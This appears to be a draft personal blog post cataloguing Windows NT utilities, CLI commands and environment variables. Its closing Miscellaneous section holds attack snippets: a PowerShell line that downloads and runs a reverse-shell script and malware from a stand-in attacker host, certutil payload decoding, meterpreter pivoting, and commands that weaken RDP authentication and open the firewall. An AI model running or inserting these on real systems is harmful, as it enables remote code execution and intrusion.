---
layout: post
draft: true
title: "Windows (winnt) gems"
slug: "winnt"
date: "2022-05-11 21:02:04+11:00"
lastmod: "2022-05-11 21:02:04+11:00"
comments: false
categories:
  - winnt
tags:
  - winnt
  - windows
  - handy
---

Modern Windows as we know it is a decendent of the original NT (new technology) code base started by the legendary [Dave Cutler](https://en.wikipedia.org/wiki/Dave_Cutler) and his team in 1988. Dave was known to have a distain for UNIX and took a different approach to building his new OS. Windows is jam packed with weird and wonderful programs, shortcuts, boot modes, hacks; I wanted to start documenting (a non-comprehensive) list of the ones I find useful.

- [File system locations](#file-system-locations)
- [Base utility programs](#base-utility-programs)
  - [GUI](#gui)
  - [CLI](#cli)
- [Environment variables](#environment-variables)
- [System information](#system-information)
- [Networking](#networking)
- [Domain](#domain)
- [Remote](#remote)
- [Miscellaneous](#miscellaneous)
  - [ACLs](#acls)
  - [Base64 decode](#base64-decode)
  - [Download file](#download-file)
  - [Firewall re-ruling](#firewall-re-ruling)
  - [Port forwarding](#port-forwarding)
  - [RDP enabling](#rdp-enabling)
- [Third party tools](#third-party-tools)
  - [sysinternals](#sysinternals)

## File system locations

- The kernel: `C:\windows\system32\ntoskrnl.exe`
- Swap file:

## Base utility programs

Most of these have shipped since the original builds of NT. This list excludes non-standard or non-default programs.

### GUI

- `appwiz.cpl`: installed programs
- `charmap`: character picker
- `compmgmt.msc` computer local management
- `control.exe system` windows about (build info)
- `cmd.exe` baked in terminal emulator
- `devmgmt.msc` device and driver management
- `diskmgmt.msc` storage volume management
- `eventvwr` event logs
- `gpedit.msc` group policy
- `inetcpl.cpl` deep rooted net options such as proxy, VPN
- `lusrmgr.msc` local users and groups
- `msconfig`: deep windows configurations
- `msinfo32` system info
- `notepad.exe` text editor
- `optionalfeatures` windows features
- `perfmon`: performance counters
- `regedt32.exe` registry editor
- `msra.exe` remote assistance
- `resmon.exe` resource usage
- `rstrui.exe` system restore
- `secpol.msc` local OS security policies
- `services.msc` daemon processes
- `sigverif`: validate driver and file signatures
- `taskmgr.exe` process manager
- `taskschd.msc` cron for windows
- `UserAccountControlSettings.exe` UAC settings
- `WF.msc` firewall
- `winver` windows build info

### CLI

| Command              | Description                                                                                                                                                       |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| append               | Allows programs to open data files in specified directories as if they were located in the current directory.                                                     |
| assoc                | Displays or changes the file type associated with a particular file extension.                                                                                    |
| at                   | Schedules commands and other programs to run at a specific date and time.                                                                                         |
| atmadm               | Displays connection information of the ATM adapter.                                                                                                               |
| attrib               | Changes the attributes of a single file or a directory.                                                                                                           |
| auditpol             | Displays information about or performs functions to manipulate audit policies.                                                                                    |
| bcdboot              | Configures the boot files on a PC or device to run the Windows operating system and to create a new system BCD store.                                             |
| bcdedit              | Used to view or make changes to Boot Configuration Data.                                                                                                          |
| bdehdcfg             | Used to prepare a hard drive for BitLocker Drive Encryption.                                                                                                      |
| bitsadmin            | Used to create, download or upload jobs and monitor their progress.                                                                                               |
| bootcfg              | Used to build, modify, or view the contents of the boot.ini file.                                                                                                 |
| bootsect             | Updates the master boot code for hard disk partitions to switch between BOOTMGR and NTLDR.                                                                        |
| break                | Sets or clears extended CTRL+C checking on DOS systems.                                                                                                           |
| cacls                | Displays or changes access of the security descriptors on folders and files.                                                                                      |
| call                 | Used to run a script or batch program from within another script or batch program.                                                                                |
| cd                   | Also known as chdir, is used to change the current working drive and/or directory in operating systems.                                                           |
| certreq              | Make certificate signing request (CSR), such as submit a request, retrieve a response, create a new request, accept, sign, policy, sign and enrol.                |
| certutil             | CA information, configure Certificate Services, backup and restore CA components, verify certificates, key pairs and certificate chains.                          |
| change               | Changes various terminal server settings like install modes, COM port mappings, and logons.                                                                       |
| chcp                 | Displays or configures the active code page number.                                                                                                               |
| chdir                | Used to display the drive letter and folder that you are currently in.                                                                                            |
| checknetisolation    | Used to test apps that require network capabilities.                                                                                                              |
| chglogon             | Enables or disables logons from client sessions on an RD Session Host (Remote Desktop Session Host) server, or displays current logon status.                     |
| chgport              | Can be used to display or change COM port mappings to be compatible with MS-DOS applications.                                                                     |
| chgusr               | Used to change the install mode for the RD Session Host server.                                                                                                   |
| chkdsk               | Verifies the file system integrity of a volume and fixes logical file system errors.                                                                              |
| chkntfs              | Used to display or modify the checking of the disk drive using NTFS at boot time.                                                                                 |
| choice               | Allows batch files to prompt the user to select one item from a set of single-character choices and return the value of that choice to the program.               |
| cipher               | Used to encrypt or decrypt files and folders on NTFS drives.                                                                                                      |
| clip                 | Copies the result of any command (stdin) to the clipboard in Windows.                                                                                             |
| cls                  | Used to clear the screen or console window of all previously entered commands and any output generated by them.                                                   |
| cmd                  | Starts a new instance of the cmd.exe command interpreter.                                                                                                         |
| cmdkey               | Used to create, list and delete stored user names or credentials.                                                                                                 |
| cmstp                | Used to install or uninstall a Connection Manager service profile.                                                                                                |
| color                | Changes the colors of the text and background within the Command Prompt window.                                                                                   |
| command              | Starts a new instance of the command.com command interpreter.                                                                                                     |
| comp                 | Performs a binary comparison of two set of files or multiple files and shows the differences between them.                                                        |
| compact              | Displays and changes the compression state of files or directories on NTFS partitions.                                                                            |
| convert              | Used to convert volumes using the FAT or FAT32 formatted file systems to NTFS.                                                                                    |
| copy                 | Copies one or more files from one directory to another.                                                                                                           |
| cscript              | Provides command-line options for setting and executing script properties via Microsoft Script Host.                                                              |
| ctty                 | Used to change the default input and output devices for the system.                                                                                               |
| date                 | Used to show or change the current date.                                                                                                                          |
| drivespace           | Initially known as DoubleSpace can be used to create or configure DoubleSpace compressed drives.                                                                  |
| debug                | Starts Debug, a command line application used to test and edit programs.                                                                                          |
| defrag               | Used to defragment a drive you specify.                                                                                                                           |
| del                  | Used to delete one or more files.                                                                                                                                 |
| deltree              | Used to delete a directory and all the files and subdirectories within it.                                                                                        |
| dir                  | Displays a list of files and folders contained inside the folder that you are currently working in.                                                               |
| diskcomp             | Used to compare contents of two floppy disks.                                                                                                                     |
| diskcopy             | Copies the entire contents of one floppy disk to another.                                                                                                         |
| diskpart             | Prevents creating multi-partition layout for removable media such as flash drives and also used for partitioning internal hard drives..                           |
| diskperf             | Used to remotely enable or disable physical or logical disk performance counters on computers running Windows 2000.                                               |
| diskraid             | Starts the DiskRAID command-line tool that allows to configure and manage redundant array of independent (or inexpensive) disks (RAID) storage subsystems.        |
| dism                 | Starts the Deployment Image Servicing and Management (DISM) tool.                                                                                                 |
| dispdiag             | Used to output a log of information about the display system.                                                                                                     |
| djoin                | Used to create a new computer account in a domain.                                                                                                                |
| doskey               | Used to edit command lines, create macros, and recall previously entered commands.                                                                                |
| dosshell             | Starts DOS Shell, a graphical file management tool for MS-DOS.                                                                                                    |
| dosx                 | Used to start DOS Protected Mode Interface (DPMI), a special mode designed to give MS-DOS applications access to more than the normally allowed 640 KB.           |
| driverquery          | Displays a list of all installed device drivers and their properties.                                                                                             |
| drvspace             | Used to create or configure DriveSpace compressed drives.                                                                                                         |
| echo                 | Used in shell scripts and batch files to output status text to the screen or a file and also to turn the echoing feature on or off.                               |
| edit                 | Starts the MS-DOS Editor tool that is used to create and modify text files.                                                                                       |
| edlin                | Starts the Edlin tool that is used to create and modify text files from the command line.                                                                         |
| emm386               | Used to give MS-DOS access to more than 640 KB of memory.                                                                                                         |
| endlocal             | Ends localization of environment changes inside a batch or script file, restoring environment variables to their values before the matching setlocal command.     |
| erase                | Used to delete one or more files.                                                                                                                                 |
| esentutl             | Provides database utilities for the Extensible Storage Engine (ESE) for Windows Vista.                                                                            |
| eventcreate          | Creates a custom event in an event log.                                                                                                                           |
| eventtriggers        | Displays and configures event triggers on local or remote machines.                                                                                               |
| exe2bin              | Converts a file of the EXE file type (executable file) to a binary file.                                                                                          |
| exit                 | Used to end the cmd.exe (Windows) or command.com (MS-DOS) session that you’re currently working in.                                                               |
| expand               | Used to extract the files and folders contained in Microsoft Cabinet (CAB) files.                                                                                 |
| extrac32             | This command is actually a CAB extraction program for use by Internet Explorer but can be used to extract any Microsoft Cabinet file.                             |
| extract              | Used to extract the files and folders contained in Microsoft Cabinet (CAB) files.                                                                                 |
| fasthelp             | This command provides more detailed information on any of the other MS-DOS commands.                                                                              |
| fastopen             | Used to add a program’s hard drive location to a special list stored in memory.                                                                                   |
| fc                   | Used to compare two individual or sets of files and then show the differences between them.                                                                       |
| fdisk                | Used to create, manage, and delete hard drive partitions.                                                                                                         |
| find                 | Used to search for a specified text string in one or more files.                                                                                                  |
| findstr              | Used to find specific text string patterns in one or more files.                                                                                                  |
| finger               | Used to find information about computer users.                                                                                                                    |
| fltmc                | Used to load, unload, list, and otherwise manage Filter drivers.                                                                                                  |
| fondue               | The fondue (Features on Demand User Experience) tool is used to install any of the several optional Windows features from the command line.                       |
| for                  | Used to run a specified command for each file in a set of files.                                                                                                  |
| forcedos             | Used to start the specified program in the MS-DOS subsystem.                                                                                                      |
| forfiles             | Selects one or more files and runs a command on them.                                                                                                             |
| format               | Used to format a drive in the file system that you specify.                                                                                                       |
| fsutil               | Perform FAT and NTFS file system tasks, reparse points and sparse files, dismounting a volume, and extending a volume.                                            |
| ftp                  | Transfers files to and from another computer.                                                                                                                     |
| ftype                | Defines a default program to open a specified file type.                                                                                                          |
| getmac               | Used to display the Media Access Control (MAC) address of all the network adapters in the computer.                                                               |
| goto                 | Used in a batch or script file to direct the command process to a labelled line in the script.                                                                    |
| gpresult             | Used to display group policy settings and resultant set of policy for a user.                                                                                     |
| gpupdate             | Refreshes local and Active Directory-based Group Policy settings, including security settings.                                                                    |
| graftabl             | Used to enable the ability of Windows to display an extended character set in graphics mode.                                                                      |
| graphics             | Used to load a program that can print graphics.                                                                                                                   |
| help                 | Provides help information for Windows commands.                                                                                                                   |
| hostname             | Displays the host name portion of the full computer name of the computer.                                                                                         |
| hwrcomp              | Used to compile custom dictionaries for handwriting recognition.                                                                                                  |
| hwrreg               | Used to install a previously compiled custom dictionary for handwriting recognition.                                                                              |
| icacls               | Display, modify, backup, or restore ACLs for files and directories.                                                                                               |
| if                   | Performs conditional functions in batch programs.                                                                                                                 |
| interlnk             | Connects two computers via a serial or parallel connection to share files and printers.                                                                           |
| intersvr             | Starts interlnk server and to copy interlnk files from one computer to another.                                                                                   |
| ipconfig             | Displays all current TCP/IP network configuration values and can modify Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings.         |
| ipxroute             | Used to display and change information about IPX routing tables.                                                                                                  |
| irftp                | Used to transmit files over an infrared link.                                                                                                                     |
| iscsicli             | Starts the Microsoft iSCSI Initiator, used to manage iSCSI.                                                                                                       |
| kb16                 | Used to support MS-DOS files that need to configure a keyboard for a specific language.                                                                           |
| keyb                 | Used to configure a keyboard for a specific language.                                                                                                             |
| klist                | Used to list service tickets of Kerberos.                                                                                                                         |
| ksetup               | Used to configure connections to a Kerberos server.                                                                                                               |
| ktmutil              | Starts the Kernel Transaction Manager utility.                                                                                                                    |
| label                | Used to manage the volume label of a disk.                                                                                                                        |
| lh                   | Shorthand version of the loadhigh command.                                                                                                                        |
| licensingdiag        | Used to generate a text-based log and other data files that contain product activation and other Windows licensing information.                                   |
| loadfix              | Used to load the specified program in the first 64K of memory and then runs the program.                                                                          |
| loadhigh             | Used to load a program into high memory and is usually used from within the autoexec.bat file.                                                                    |
| lock                 | Used to lock a drive, enabling direct disk access for a program.                                                                                                  |
| lodctr               | This is used to update registry values related to performance counters.                                                                                           |
| logman               | Used to create and manage Event Trace Session and Performance logs.                                                                                               |
| logoff               | Used to terminate a session.                                                                                                                                      |
| lpq                  | Displays the status of a print queue on a computer running Line Printer Daemon (LPD).                                                                             |
| lpr                  | Used to send a file to a computer running Line Printer Daemon (LPD).                                                                                              |
| makecab              | Used to create .cab files.                                                                                                                                        |
| manage-bde           | Used to configure BitLocker Drive Encryption from the command line.                                                                                               |
| md                   | Shorthand version of the mkdir command.                                                                                                                           |
| mem                  | Shows information about used and free memory areas and programs that are currently loaded into memory in the MS-DOS subsystem.                                    |
| memmaker             | Used to start MemMaker, a memory optimization tool.                                                                                                               |
| mkdir                | Used to create a new folder.                                                                                                                                      |
| mklink               | Creates a symbolic link.                                                                                                                                          |
| mode                 | Used to configure system devices, most often COM and LPT ports.                                                                                                   |
| mofcomp              | This command properly displays the data within a Managed Object Format (MOF) file.                                                                                |
| more                 | Used to display the information contained in a text file.                                                                                                         |
| mount                | Used to mount Network File System (NFS) network shares.                                                                                                           |
| mountvol             | Used to display, create, or remove volume mount points.                                                                                                           |
| move                 | Used to move one or files from one folder to another.                                                                                                             |
| mrinfo               | Used to provide information about a router’s interfaces and neighbors.                                                                                            |
| msav                 | This command starts Microsoft Antivirus.                                                                                                                          |
| msbackup             | This command starts Microsoft Backup, a tool used to back up and restore one or more files.                                                                       |
| mscdex               | Used to provide CD-ROM access to MS-DOS.                                                                                                                          |
| msd                  | Starts Microsoft Diagnostics.                                                                                                                                     |
| msg                  | Used to send a message to a user.                                                                                                                                 |
| msiexec              | Used to start Windows Installer, a tool used to install and configure software.                                                                                   |
| muiunattend          | This command starts the Multilanguage User Interface unattended setup process.                                                                                    |
| nbtstat              | This command is used to show TCP/IP information and other statistical information about a remote computer.                                                        |
| net                  | Used to display, configure, and correct a wide variety of network settings.                                                                                       |
| net1                 | Used to display, configure, and correct a wide variety of network settings.                                                                                       |
| netcfg               | Used to install the Windows Preinstallation Environment (WinPE),                                                                                                  |
| netsh                | Used to start Network Shell, a command-line utility used to manage the network configuration of the local, or a remote, computer.                                 |
| netstat              | This command is most commonly used to display all open network connections and listening ports.                                                                   |
| nfsadmin             | This command is used to manage Server for NFS or Client for NFS from the command line.                                                                            |
| nlsfunc              | Used to load information specific to a particular country or region.                                                                                              |
| nltest               | Used to test secure channels between Windows computers in a domain and between domain controllers that are trusting other domains.                                |
| nslookup             | The command is most commonly used to display the hostname of an entered IP address.                                                                               |
| ntbackup             | Used to perform various backup functions from the Command.                                                                                                        |
| ntsd                 | Used to perform certain command line debugging tasks.                                                                                                             |
| ocsetup              | This command starts the Windows Optional Component Setup tool, used to install additional Windows features.                                                       |
| openfiles            | Used to display and disconnect open files and folders on a system.                                                                                                |
| path                 | Used to display or set a specific path available to executable files.                                                                                             |
| pathping             | Functions much like the tracert command, will also report information about network latency and loss at each hop.                                                 |
| pause                | Used within a batch or script file to pause the processing of the file.                                                                                           |
| pentnt               | Used to detect floating point division errors in the Intel Pentium chip.                                                                                          |
| ping                 | The command sends an Internet Control Message Protocol (ICMP) Echo Request message to a specified remote computer to verify IP-level connectivity.                |
| pkgmgr               | Used to start the Windows Package Manager from the Command Prompt.                                                                                                |
| pnpunattend          | Used to automate the installation of hardware device drivers.                                                                                                     |
| pnputil              | Used to start the Microsoft PnP Utility, a tool used to install a Plug and Play device from the command line.                                                     |
| popd                 | This command is used to change the current directory to the one most recently stored by the pushd command.                                                        |
| power                | Used to reduce the power consumed by a computer by monitoring software and hardware devices.                                                                      |
| powercfg             | Used to manage the Windows power management settings from the command line.                                                                                       |
| print                | Used to print a specified text file to a specified printing device.                                                                                               |
| prompt               | Used to customize the appearance of the prompt text in Command Prompt or MS-DOS.                                                                                  |
| pushd                | Used to store a directory for use, most commonly from within a batch or script program.                                                                           |
| pwlauncher           | Used to enable, disable, or show the status of your Windows To Go start-up options.                                                                               |
| qappsrv              | Used to display all Remote Desktop Session Host servers available on the network.                                                                                 |
| qbasic               | This command starts QBasic, the MS-DOS based programming environment for the BASIC programming language.                                                          |
| qprocess             | Used to display information about running processes.                                                                                                              |
| query                | Used to display the status of a specified service.                                                                                                                |
| quser                | Used to display information about users currently logged on to the system.                                                                                        |
| qwinsta              | Used to display information about open Remote Desktop Sessions.                                                                                                   |
| rasautou             | Used to manage Remote Access Dialer AutoDial addresses.                                                                                                           |
| rasdial              | Used to start or end a network connection for a Microsoft client.                                                                                                 |
| rcp                  | Used to copy files between a Windows computer and a system running the rshd daemon.                                                                               |
| rd                   | Shorthand version of the rmdir command.                                                                                                                           |
| rdpsign              | Used to sign a Remote Desktop Protocol (RDP) file.                                                                                                                |
| reagentc             | Used to configure the Windows Recovery Environment (RE).                                                                                                          |
| recimg               | Used to create a custom refresh image.                                                                                                                            |
| recover              | Used to recover readable data from a bad or defective disk.                                                                                                       |
| reg                  | Used to manage the Windows Registryfrom the command line.                                                                                                         |
| regini               | Used to set or change registry permissions and registry values from the command line.                                                                             |
| register-cimprovider | Used to register a Common Information Model (CIM) Provider in Windows.                                                                                            |
| regsvr32             | Used to register a DLL file as a command component in the Windows Registry.                                                                                       |
| relog                | Used to create new performance logs from data in existing performance logs.                                                                                       |
| rem                  | Used to record comments or remarks in a batch or script file.                                                                                                     |
| ren                  | The shorthand version of the rename command.                                                                                                                      |
| rename               | Used to change the name of the individual file that you specify.                                                                                                  |
| repair-bde           | Used to repair or decrypt a damaged drive that’s been encrypted using BitLocker.                                                                                  |
| replace              | Used to replace one or more files with one or more other files.                                                                                                   |
| reset                | This command, executed as reset session, is used to reset the session subsystem software and hardware to known initial values.                                    |
| restore              | Used to restore files that were backed up using the backup command.                                                                                               |
| rexec                | Used to run commands on remote computers running the rexec daemon.                                                                                                |
| rmdir                | Used to delete an existing or completely empty folder.                                                                                                            |
| robocopy             | Used to copy files and directories from one location to another.                                                                                                  |
| route                | Used to manipulate network routing tables.                                                                                                                        |
| rpcinfo              | This command makes a remote procedure call (RPC) to an RPC server and reports what it finds.                                                                      |
| rpcping              | Used to ping a server using RPC.                                                                                                                                  |
| rsh                  | Used to run commands on remote computers running the rsh daemon.                                                                                                  |
| rsm                  | Used to manage media resources using Removable Storage.                                                                                                           |
| runas                | Used to execute a program using another user’s credentials.                                                                                                       |
| rwinsta              | Shorthand version of the reset session command.                                                                                                                   |
| sc                   | Used to configure information about services.                                                                                                                     |
| scandisk             | Used to start Microsoft ScanDisk, a disk repair program.                                                                                                          |
| scanreg              | This command starts Windows Registry Checker, a basic registry repair program and backup utility.                                                                 |
| schtasks             | Used to schedule specified programs or commands to run a certain times.                                                                                           |
| sdbinst              | Used to deploy customized SDB database files.                                                                                                                     |
| secedit              | Used to configure and analyze system security by comparing the current security configuration to a template.                                                      |
| set                  | Used to display, enable, or disable environment variables in MS-DOS or from the Command Prompt.                                                                   |
| setlocal             | Used to start the localization of environment changes inside a batch or script file.                                                                              |
| setspn               | Used to manage the Service Principal Names (SPN) for an Active Directory (AD) service account.                                                                    |
| setver               | Used to set the MS-DOS version number that MS-DOS reports to a program.                                                                                           |
| setx                 | Used to create or change environment variables in the user environment or the system environment.                                                                 |
| sfc                  | Used to verify and replace important Windows system files.                                                                                                        |
| shadow               | Used to monitor another Remote Desktop Services session.                                                                                                          |
| share                | Used to install file locking and file sharing functions in MS-DOS.                                                                                                |
| shift                | Used to change the position of replaceable parameters in a batch or script file.                                                                                  |
| showmount            | Used to display information about NFS mounted file systems.                                                                                                       |
| shutdown             | Used to shut down, restart, or log off the current system or a remote computer.                                                                                   |
| smartdrv             | This command installs and configures SMARTDrive, a disk caching utility for MS-DOS.                                                                               |
| sort                 | Used to read data from a specified input, sort that data, and return the results of that sort to the Command Prompt screen, a file, or another output device.     |
| start                | Used to open a new command line window to run a specified program or command.                                                                                     |
| subst                | Used to associate a local path with a drive letter.                                                                                                               |
| sxstrace             | Used to start the WinSxs Tracing Utility, a programming diagnostic tool.                                                                                          |
| sys                  | Used to copy the MS-DOS system files and command interpreter to a disk.                                                                                           |
| systeminfo           | Used to display basic Windows configuration information for the local or a remote computer.                                                                       |
| takeown              | Used to regain access to a file that that an administrator was denied access to when reassigning ownership of the file.                                           |
| taskkill             | Used to terminate a running task.                                                                                                                                 |
| tasklist             | Displays a list of applications, services, and the Process ID (PID) currently running on either a local or a remote computer.                                     |
| tcmsetup             | Used to setup or disable the Telephony Application Programming Interface (TAPI) client.                                                                           |
| telnet               | Used to communicate with remote computers that use the Telnet protocol.                                                                                           |
| tftp                 | Used to transfer files to and from a remote computer that’s running the Trivial File Transfer Protocol (TFTP) service or daemon.                                  |
| time                 | Used to show or change the current time.                                                                                                                          |
| timeout              | Used in a batch or script file to provide a specified timeout value during a procedure.                                                                           |
| title                | Used to set the Command Prompt window title.                                                                                                                      |
| tlntadmn             | Used to administer a local or remote computer running Telnet Server.                                                                                              |
| tpmvscmgr            | Used to create and destroy TPM virtual smart cards.                                                                                                               |
| tracerpt             | Used to process event trace logs or real-time data from instrumented event trace providers.                                                                       |
| tracert              | Send ICMP echo requests to a specified remote computer with increasing Time to Live (TTL) field values and displays the router hops in-between                    |
| tree                 | Used to graphically display the folder structure of a specified drive or path.                                                                                    |
| tscon                | Used to attach a user session to a Remote Desktop session.                                                                                                        |
| tsdiscon             | Used to disconnect a Remote Desktop session.                                                                                                                      |
| tskill               | Used to end the specified process.                                                                                                                                |
| tsshutdn             | Used to remotely shut down or restart a terminal server.                                                                                                          |
| type                 | Used to display the information contained in a text file.                                                                                                         |
| typeperf             | This command displays performance data in the Command Prompt window or writes the data to specified log file.                                                     |
| tzutil               | Used to display or configure the current system’s time zone.                                                                                                      |
| umount               | Used to remove Network File System (NFS) mounted network shares.                                                                                                  |
| undelete             | Used to undo a deletion performed with the MS-DOS delete command.                                                                                                 |
| unformat             | Used to undo the formatting on a drive performed by the MS-DOS format command.                                                                                    |
| unlock               | Used to unlock a drive, disabling direct disk access for a program.                                                                                               |
| unlodctr             | Removes Explain text and Performance counter names for a service or device driver from the Windows Registry.                                                      |
| vaultcmd             | Used to create, remove, and show stored credentials.                                                                                                              |
| ver                  | Used to display the current Windows or MS-DOS version number.                                                                                                     |
| verify               | Used to enable or disable the ability of Command Prompt, or MS-DOS, to verify that files are written correctly to a disk.                                         |
| vol                  | Shows the volume label and serial number of a specified disk, assuming this information exists.                                                                   |
| vsafe                | Used to start VSafe, a basic virus protection system for MS-DOS.                                                                                                  |
| vssadmin             | Volume Shadow Copy Service CLI, shows current volume shadow copy backups and all installed shadow copy writers and providers.                                     |
| w32tm                | Used to diagnose issues with Windows Time.                                                                                                                        |
| waitfor              | Used to send or wait for a signal on a system.                                                                                                                    |
| wbadmin              | Used start and stop backup jobs, display details about a previous backup, list the items within a backup, and report on the status of a currently running backup. |
| wecutil              | Used to manage subscriptions to events that are forwarded from WS-Management supported computers.                                                                 |
| wevtutil             | This command starts the Windows Events Command Line Utility which is used to manage event logs and publishers.                                                    |
| where                | Used to search for files that match a specified pattern.                                                                                                          |
| whoami               | Used to retrieve user name and group information on a network.                                                                                                    |
| winmgmt              | Starts the command line version of WMI, a scripting tool in Windows.                                                                                              |
| winrm                | Used to start the command line version of Windows Remote Management, used to manage secure communications with local and remote computers using web services.     |
| winrs                | Used to open a secure command window with a remote host.                                                                                                          |
| winsat               | Starts the Windows System Assessment Tool, a program that assesses various features, attributes, and capabilities of a computer running Windows.                  |
| wmic                 | Windows Management Instrumentation (WMIC) shell.                                                                                                                  |
| wsmanhttpconfig      | Used to manage aspects of the Windows Remote Management (WinRM) service.                                                                                          |
| xcopy                | Used to copy one or more files or directory trees from one location to another. See robocopy.                                                                     |
| xwizard              | This command, short for Extensible Wizard, is used to register data in Windows, often from a preconfigured XML file.                                              |

## Environment variables

The base NT set:

- `ALLUSERSPROFILE`: `C:\ProgramData`
- `APPDATA`: `C:\Users\shnerg\AppData\Roaming`
- `CommonProgramFiles`: `C:\Program Files\Common Files`
- `CommonProgramFiles(x86)` : `C:\Program Files (x86)\Common Files`
- `CommonProgramW6432`: `C:\Program Files\Common Files`
- `COMPUTERNAME`: `RYZEN-WIN11`
- `ComSpec`: `C:\Windows\system32\cmd.exe`
- `DriverData`: `C:\Windows\System32\Drivers\DriverData`
- `HOMEDRIVE`: `C:`
- `HOMEPATH`: `\Users\shnerg`
- `LOCALAPPDATA`: `C:\Users\shnerg\AppData\Local`
- `LOGONSERVER`: `\\RYZEN-WIN11`
- `NUMBER_OF_PROCESSORS`: `12`
- `OS`: `Windows_NT`
- `Path`: `C:\Program Files\PowerShell\7;C:\Program Files (x86)\Microsoft SDKs\Azure\CLI2\wbin;C:\…`
- `PATHEXT`: `.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL`
- `PROCESSOR_ARCHITECTURE`: `AMD64`
- `PROCESSOR_IDENTIFIER`: `AMD64 Family 25 Model 33 Stepping 0, AuthenticAMD`
- `PROCESSOR_LEVEL`: `25`
- `PROCESSOR_REVISION`: `2100`
- `ProgramData`: `C:\ProgramData`
- `ProgramFiles`: `C:\Program Files`
- `ProgramFiles(x86)` : `C:\Program Files (x86)`
- `ProgramW6432`: `C:\Program Files`
- `PUBLIC`: `C:\Users\Public`
- `SystemDrive`: `C:`
- `SystemRoot`: `C:\Windows`
- `TEMP`: `C:\Users\shnerg\AppData\Local\Temp`
- `TMP`: `C:\Users\shnerg\AppData\Local\Temp`
- `USERDOMAIN`: `RYZEN-WIN11`
- `USERDOMAIN_ROAMINGPROFILE`: `RYZEN-WIN11`
- `USERNAME`: `shnerg`
- `USERPROFILE`: `C:\Users\shnerg`
- `windir`: `C:\Windows`

## System information

- `sc query state=all` running daemons
- `tasklist /svc` show running processes and daemons
- `tasklist /m` show processes and DLLs
- `tasklist /S <ip> /v` remote process listing

## Networking

## Domain

## Remote

## Miscellaneous

### ACLs

```bat
icacls text.txt /grant Everyone:F
```

### Base64 decode

```bat
certutil -decode foo.b64 foo.exe
```

### Download file

```powershell
IEX (New-Object System.Net.WebClient).DownloadString("http://ATTACKER_IP/rev.ps1")(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_SERVER/malware.exe", "C:\Windows\Temp\malware.exe")  Invoke-WebRequest "http://ATTACKER_SERVER/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"
```

### Firewall re-ruling

```bat
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
```

### Port forwarding

```bash
 # using plink
 plink.exe -l user -pw pass123 192.168.1.56 -R 8080:127.0.0.1:8080

 # using meterpreterportfwd
 add -l attacker-port -p victim-port -r victim-ip
 portfwd add -l 3306 -p 3306 -r 192.168.1.56

 # Dynamic Pivoting using ssh with proxy chain
 ssh -D 9050 root@target

 # using ssh
 ssh -L localhost:8080:target:8080 root@targetip
```

### RDP enabling

```bat
# CMD
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
# Powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Optional
net localgroup "Remote Desktop Users" morph3 /add

# Re-ruling firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
```

## Third party tools

- [Fiddler](http://www.fiddlertool.com/) HTTP/HTTPS protocol debugging proxy
- [PureText](http://stevemiller.net/puretext/) removes rich formatting from text
- [ScreenToGif](https://www.screentogif.com/)
- [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) Mark Russinovich's low-level utility collection
- [ZoomIt](https://docs.microsoft.com/en-us/sysinternals/downloads/zoomit) on screen drawing and zooming
- [Windows PowerToys](https://docs.microsoft.com/en-us/windows/powertoys/) color picker, fancy zones, file explorer addons, image resizers, keyboard manager and remapper, an Apple Spotlight-like launcher, Shortcut Guide
- [Winget](https://docs.microsoft.com/en-us/windows/package-manager/winget/) apt for windows
- [WinDirStat](https://windirstat.net/)
- [WinDbg](https://www.microsoft.com/en-us/p/windbg-preview/9pgjgd53tn86) low level goodness

### sysinternals
